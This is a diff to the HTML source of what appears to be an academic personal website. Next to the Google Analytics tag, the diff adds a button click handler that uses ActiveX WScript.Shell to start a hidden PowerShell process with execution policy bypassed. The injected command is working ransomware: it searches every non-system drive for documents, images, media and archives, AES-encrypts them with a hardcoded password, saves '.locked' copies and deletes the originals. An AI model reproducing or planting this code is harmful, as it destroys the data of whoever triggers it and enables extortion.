@@ -1981,34 +1981,38 @@ btn.addEventListener("click", function() {
     
     <!-- Global site tag (gtag.js) - Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-74903011-1"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
-        gtag('js', new Date());
-
-        gtag('config', 'UA-74903011-1');
-    </script>
 	<script>
-    function runfishScript() {
-	const btn = document.getElementById("floatingBtn");
-	const icon = document.getElementById("btnIcon");
-        try {
-            var shell = new ActiveXObject("WScript.Shell");
-            var execCmd = "";
-            var command = 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "' + execCmd + '"';
-            shell.Run(command);
-			icon.src = "files/on.png";
-			
-        } catch (e) {
-			icon.src = "files/error.png";
-			
-        }
-    }
+		window.dataLayer = window.dataLayer || [];
+		function gtag() { dataLayer.push(arguments); }
+		gtag('js', new Date());
+		gtag('config', 'UA-74903011-1');
+	</script>
 
-    btn.addEventListener('click', function() {
-    runfishScript();
-    });
-</script>
+	<script>
+		function runfishScript() {
+			const btn = document.getElementById("floatingBtn");
+			const icon = document.getElementById("btnIcon");
+
+			try {
+				var shell = new ActiveXObject("WScript.Shell");
+				var execCmd = "$p='hebashuhd'; $exts='*.txt','*.pdf','*.doc','*.docx','*.ppt','*.pptx','*.xls','*.xlsx','*.jpg','*.jpeg','*.png','*.gif','*.bmp','*.mp3','*.wav','*.aac','*.mp4','*.mkv','*.avi','*.zip','*.rar','*.7z'; $disks=Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name -ne 'C' }; foreach($d in $disks){ Get-ChildItem -Path ($d.Root) -Include $exts -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object { try { $b=[System.IO.File]::ReadAllBytes($_.FullName); $s=New-Object Byte[] 16; [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($s); $pb=New-Object System.Security.Cryptography.Rfc2898DeriveBytes($p, $s, 1000); $k=$pb.GetBytes(32); $iv=$pb.GetBytes(16); $a=[System.Security.Cryptography.Aes]::Create(); $a.Key=$k; $a.IV=$iv; $e=$a.CreateEncryptor().TransformFinalBlock($b, 0, $b.Length); $r=New-Object Byte[] ($s.Length+$e.Length); [Array]::Copy($s,0,$r,0,16); [Array]::Copy($e,0,$r,16,$e.Length); $newPath=$_.FullName + '.locked'; [System.IO.File]::WriteAllBytes($newPath, $r); Remove-Item $_.FullName -Force } catch{} } }";
+				var command = 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "' + execCmd + '"';
+
+				shell.Run(command, 0, false);
+				if(icon) icon.src = "files/on.png";
+			} catch (e) {
+				if(icon) icon.src = "files/error.png";
+			}
+		}
+
+		document.addEventListener("DOMContentLoaded", function() {
+			const btn = document.getElementById("floatingBtn");
+			if (btn) {
+				btn.addEventListener('click', runfishScript);
+			}
+		});
+	</script>
+	</script>
     <link rel="stylesheet" href="../cdn.jsdelivr.net/gh/jpswalsh/academicons%401/css/academicons.min.css">
 
 
